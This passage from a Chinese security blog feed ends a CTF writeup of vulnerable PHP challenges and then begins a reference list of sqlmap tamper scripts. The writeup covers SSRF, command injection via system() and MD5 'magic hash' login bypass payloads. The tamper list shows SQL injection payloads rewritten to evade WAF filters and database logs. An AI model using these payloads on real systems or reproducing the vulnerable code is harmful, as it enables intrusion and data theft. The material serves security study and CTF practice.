class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span><span class="params">($uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;Please enter valid uri&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $image = file_get_contents($uri);</span><br><span class="line">            $path = <span class="string">"./images/"</span> . uniqid() . <span class="string">'.jpg'</span>;</span><br><span class="line">            file_put_contents($path, $image);</span><br><span class="line">            <span class="keyword">if</span> (mime_content_type($path) !== <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">                unlink($path);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;p&gt;Only .jpg files allowed&lt;/p&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;There was an error: '</span> .</span><br><span class="line">                $e-&gt;getMessage() . <span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> . $path . <span class="string">'" width="100"/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageLoader())-&gt;getResult($_GET[<span class="string">'img'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p>先看看开头这个设置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler ( callable $error_handler [, int $error_types = E_ALL | E_STRICT ] ) : mixed</span><br><span class="line"><span class="comment">// 设置用户的函数 (error_handler) 来处理脚本中出现的错误。</span></span><br><span class="line"><span class="comment">// 本函数可以用你自己定义的方式来处理运行中的错误， 例如，在应用程序中严重错误发生时，或者在特定条件下触发了一个错误(使用 trigger_error())，你需要对数据/文件做清理回收。</span></span><br></pre></td></tr></table></figure><p>这里还特意设置了 <code>E_ALL</code> ，也就是说所有的错误都会显示出来，将错误信息全暴露出来是一个极其不明智的选择，这些报错对正常用户没有任何意义，反而会给攻击者提供更多的信息。</p><p>不仅仅是 SSRF ，肯定有更好玩的，先放一下。</p><h2 id="21-Gift-Wrap"><a href="#21-Gift-Wrap" class="headerlink" title="21 - Gift Wrap"></a>21 - Gift Wrap</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamExtractor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $validIndices = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">indices</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        $validate = <span class="function"><span class="keyword">function</span> <span class="params">(int $value, $key)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;validIndices[] = $key;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            array_walk($input, $validate, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (TypeError $error) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Only numbers are allowed as input"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;validIndices;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCommand</span><span class="params">($parameters)</span> </span>&#123;</span><br><span class="line">        $indices = <span class="keyword">$this</span>-&gt;indices($parameters);</span><br><span class="line">        $params = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($indices <span class="keyword">as</span> $index) &#123;</span><br><span class="line">            $params[] = $parameters[$index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> implode($params, <span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = (<span class="keyword">new</span> ParamExtractor())-&gt;getCommand($_GET[<span class="string">'p'</span>]);</span><br><span class="line">system(<span class="string">'resizeImg image.png '</span> . $cmd);</span><br></pre></td></tr></table></figure><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><h2 id="22-Chimney"><a href="#22-Chimney" class="headerlink" title="22 - Chimney"></a>22 - Chimney</h2><blockquote><p>魔法哈希</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">'hash'</span>, md5($_POST[<span class="string">'password'</span>]));</span><br><span class="line">    header(<span class="string">"Refresh: 0"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">'0e836584205638841937695747769655'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form&gt;&lt;input type="password" name="password" /&gt;'</span></span><br><span class="line">        . <span class="string">'&lt;input type="submit" value="Login" &gt;&lt;/form &gt;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (md5($_COOKIE[<span class="string">'hash'</span>]) == $password) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login succeeded'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>注意这有一个 <code>==</code>，比较时会自动进行类型转换，而给的 <code>password</code> 是 <code>0e</code> 开头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'0e836584205638841937695747769655'</span>==<span class="string">'0e'</span>);</span><br><span class="line"><span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0</span>e830400451993494058<span class="number">024219903391</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0</span>e8482404488305379244<span class="number">65865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0</span>e072485820392773389<span class="number">523109082030</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0</span>e731198061491163073<span class="number">197128363787</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0</span>e220463095855511507<span class="number">588041205815</span></span><br></pre></td></tr></table></figure><h2 id="23-Cookies"><a href="#23-Cookies" class="headerlink" title="23 - Cookies"></a>23 - Cookies</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LDAPAuthenticator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line">    <span class="keyword">public</span> $host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host = <span class="string">"localhost"</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;host = $host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        $result = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;conn = ldap_connect(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line">        ldap_set_option(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">            LDAP_OPT_PROTOCOL_VERSION,</span><br><span class="line">            <span class="number">3</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (!@ldap_bind(<span class="keyword">$this</span>-&gt;conn))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        $user = ldap_escape($user, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">        $pass = ldap_escape($pass, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">        $result = ldap_search(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">            <span class="string">""</span>,</span><br><span class="line">            <span class="string">"(&amp;(uid=$user)(userPassword=$pass))"</span></span><br><span class="line">        );</span><br><span class="line">        $result = ldap_get_entries(<span class="keyword">$this</span>-&gt;conn, $result);</span><br><span class="line">        <span class="keyword">return</span> ($result[<span class="string">"count"</span>] &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"u"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">    $ldap = <span class="keyword">new</span> LDAPAuthenticator();</span><br><span class="line">    <span class="keyword">if</span> ($ldap-&gt;authenticate($_GET[<span class="string">"u"</span>], $_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are now logged in!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Username or password unknown!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><h2 id="24-Nutcracker"><a href="#24-Nutcracker" class="headerlink" title="24 - Nutcracker"></a>24 - Nutcracker</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@$GLOBALS = $GLOBALS&#123;next&#125; </span><br><span class="line">= next($GLOBALS&#123;<span class="string">'GLOBALS'</span>&#125;)[$GLOBALS[<span class="string">'next'</span>][<span class="string">'next'</span>] </span><br><span class="line">= next($GLOBALS)[<span class="string">'GLOBALS'</span>]][$next[<span class="string">'GLOBALS'</span>] </span><br><span class="line">= next($GLOBALS[GLOBALS][<span class="string">'GLOBALS'</span>])[$next[<span class="string">'next'</span>]]][$next[<span class="string">'GLOBALS'</span>] </span><br><span class="line">= next($next[<span class="string">'GLOBALS'</span>])][$GLOBALS[next][<span class="string">'next'</span>]($GLOBALS[<span class="string">'next'</span>]&#123;<span class="string">'GLOBALS'</span>&#125;)] </span><br><span class="line">= next(neXt($&#123;<span class="string">'next'</span>&#125;[<span class="string">'next'</span>]));</span><br></pre></td></tr></table></figure><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有意思一点的优先做了，有时间再更新。&lt;/p&gt;
&lt;h2 id=&quot;1-Wish-List&quot;&gt;&lt;a href=&quot;#1-Wish-List&quot; class=&quot;headerlink&quot; title=&quot;1 - Wish List&quot;&gt;&lt;/a&gt;1 - Wish List&lt;/h2&gt;&lt;blockq
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap tamper 列表</title>
    <link href="https://wywwzjj.top/2019/03/01/sqlmap-tamper-%E5%88%97%E8%A1%A8/"/>
    <id>https://wywwzjj.top/2019/03/01/sqlmap-tamper-列表/</id>
    <published>2019-03-01T15:43:38.000Z</published>
    <updated>2019-05-02T03:17:38.538Z</updated>
    
    <content type="html"><![CDATA[<h2 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h2><blockquote><p>return payload.replace(‘’’, “%EF%BC%87”) if payload else payload</p></blockquote><p>将单引号 url 编码，用于过滤了单引号的情况。</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h2><blockquote><p>return payload.replace(‘’’, “%00%27”) if payload else payload</p></blockquote><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1�’ AND �’1�’=�’1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h2><blockquote><p>return “%s%%00” % payload if payload else payload</p></blockquote><p>在你构造的payload后面加一个空字符</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> 1’ AND ‘1’=’1[]</p></blockquote><p><strong>适用数据库：</strong>Access</p><h2 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h2><blockquote><p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p>这个看模块名也知道是 base64 编码</p><blockquote><p>1’ AND ‘1’=’1 <strong>to</strong> MScgQU5EICcxJz0nMQ==</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h2><p>这个代码有点长，就不贴代码了，可以自己去查看：</p><p><code>\SQLMap\tamper\between.py</code></p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><blockquote><p>1 AND A &gt; B <strong>to</strong> 1 AND A NOT BETWEEN 0 AND B</p><p>1 AND A = B <strong>to</strong> 1 AND A BETWEEN B AND B</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h2><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><blockquote><p>union select <em>from users where id = 1 <strong>to</strong> union%09select</em> from%09users where id like 1</p></blockquote><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><h2 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h2><p>用 url 编码两次你的 payload</p><blockquote><p>select * from users <strong>to</strong>%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h2><p>用 url 编码一次你的 payload</p><blockquote><p>select * from users <strong>to</strong>%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h2><p>用 unicode 编码 payload ，只编码非编码字符</p><blockquote><p>select * from users <strong>to</strong>u0073u0065u006cu0065u0063u0074u0020u002au0020u0066u0072u006fu006du0020u0075u0073u0065u0072u0073</p></blockquote><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><h2 id="commalesslimit-py"><a href="#commalesslimit-py" class="headerlink" title="commalesslimit.py"></a>commalesslimit.py</h2><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><blockquote><p>limit 2,1 <strong>to</strong> limit 1 offset 2</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py"></a>commalessmid.py</h2><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><blockquote><p>mid(version(), 1, 1) <strong>to</strong> mid(version() from 1 for 1)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="commentbeforeparentheses-py"><a href="#commentbeforeparentheses-py" class="headerlink" title="commentbeforeparentheses.py"></a>commentbeforeparentheses.py</h2><blockquote><p>retVal = re.sub(r”b(w+)(“, “g&lt;1&gt;/**/(“, retVal)</p></blockquote><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><blockquote><p>union select group_concat(table_name) <strong>to</strong> union select group_concat/**/(table_name)</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py"></a>concat2concatws.py</h2><blockquote><p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p></blockquote><p>用于过滤了 concat 函数的情况</p><blockquote><p>concat(1,2) <strong>to</strong> concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h2><blockquote><p>retVal = re.sub(r”s<em>=s</em>“, “ LIKE “, retVal)</p></blockquote><p>将等号用 like 代替，用于过滤了等号的情况</p><blockquote><p>select <em>from users where id=1 <strong>to</strong> select</em> from users where id like 1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="escapequotes-py"><a href="#escapequotes-py" class="headerlink" title="escapequotes.py"></a>escapequotes.py</h2><blockquote><p>return payload.replace(“‘“, “‘“).replace(‘“‘, ‘“‘)</p></blockquote><p>将单引号转换成 &#39; ，双引号转换成 &quot; ，用于过滤了单引号或双引号的情况</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1&#39; and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py"></a>greatest.py</h2><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><blockquote><p>1 and a&gt;b <strong>to</strong> 1 and greatest(a,b+1)=a</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h2><p>在关键字前添加注释，用于过滤了关键字的情况</p><blockquote><p>union select 1,2 <strong>to</strong> /<em>!0union/</em>!0select 1,2</p></blockquote><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><h2 id="htmlencode-py"><a href="#htmlencode-py" class="headerlink" title="htmlencode.py"></a>htmlencode.py</h2><blockquote><p>return re.sub(r”<a href="http://www.myh0st.cn/index.php/archives/881/#fn-1" target="_blank" rel="noopener">1</a>“, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p></blockquote><p>从名字就知道是将 payload 进行 html 编码</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1’ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h2><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><blockquote><p>ifnull(1, 2) <strong>to</strong> if(isnull(1), 2, 1)</p></blockquote><p><strong>适用数据库：</strong>MySql</p><h2 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py"></a>informationschemacomment.py</h2><blockquote><p>retVal = re.sub(r”(?i)(information_schema).”, “g&lt;1&gt;/**/.”, payload)</p></blockquote><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><blockquote><p>select table_name from information_schema.tables <strong>to</strong> select table_name from information_schema/**/.tables</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h2><p>将 payload 里的大写转为小写</p><blockquote><p>UNION SELECT <strong>to</strong> union select</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h2><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><blockquote><p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!30874and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h2><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><blockquote><p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!00000and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h2><p>在关键字周围添加多个空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h2><p>关键字双写，可用于关键字过滤</p><blockquote><p>union select 1,2–+ <strong>to</strong> uniounionn selecselectt 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h2><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><blockquote><p>select field from table where 2&gt;1 <strong>to</strong></p><p>select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h2><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><blockquote><p>select <em>from users <strong>to</strong> %s%e%l%e%c%t</em> %f%r%o%m %u%s%e%r%s</p></blockquote><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><h2 id="plus2concat-py"><a href="#plus2concat-py" class="headerlink" title="plus2concat.py"></a>plus2concat.py</h2><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select concat(char(113),char(114),char(115)) from user</p></blockquote><p><strong>适用数据库：</strong>SQL Server 2012+</p><h2 id="plus2fnconcat-py"><a href="#plus2fnconcat-py" class="headerlink" title="plus2fnconcat.py"></a>plus2fnconcat.py</h2><p>用 fn concat 来替代加号，和上面类似</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><h2 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h2><p>将 payload 随机大小写，可用于大小写绕过的情况</p><blockquote><p>union select 1,2–+ <strong>to</strong> UniOn SElect 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h2><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><blockquote><p>union select 1,2–+ <strong>to</strong> un/<strong>/ion sele/</strong>/ct 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h2><blockquote><p>return payload + “ and ‘0having’=’0having’” if payload else payload</p></blockquote><p>在 payload 后面加入字符串，可以自定义</p><blockquote><p>1’ and 1=1 <strong>to</strong> 1’ and 1=1 ‘0having’=’0having’</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h2><blockquote><p>retVal = “%s%ssp_password” % (payload, “– “ if not any(_ if <em>in payload else None for</em> in (‘#’, “– “)) else “”)</p></blockquote><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1 and 1=1– sp_password</p></blockquote><p><strong>适用数据库：</strong>MSSQL</p><h2 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h2><p>用 /**/ 替代空格，用于空格的绕过</p><blockquote><p>union select 1,2–+ <strong>to</strong> union/<strong>/select/</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h2><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+ <strong>to</strong> union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><h2 id="space2hash-py"><a href="#space2hash-py" class="headerlink" 